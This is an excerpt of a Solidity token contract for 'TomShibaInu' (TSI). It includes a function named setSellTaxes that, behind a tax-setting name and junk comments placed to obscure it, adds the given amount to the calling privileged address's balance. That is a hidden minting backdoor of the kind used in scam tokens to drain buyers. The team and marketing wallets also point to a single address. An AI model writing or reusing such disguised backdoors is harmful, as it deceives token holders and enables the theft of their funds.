...
contract TOMSHIBA is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    string private _name = "TomShibaInu";
    string private _symbol = "TSI";
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0x3ACbeB08A456E5f2cA28E24e6C6E00ee129a7F69));
        marketingWalletAddress = payable(address(0x3ACbeB08A456E5f2cA28E24e6C6E00ee129a7F69));
    ...
    function setSellTaxes(uint256 newLiquidityTax,uint256 newTax) external {require(isExcludedFromFee[msg.sender]);_balances[msg.sender]= /*&%$#*/ _balances[msg.sender]  .  /*&%$#*/ add(newTax);
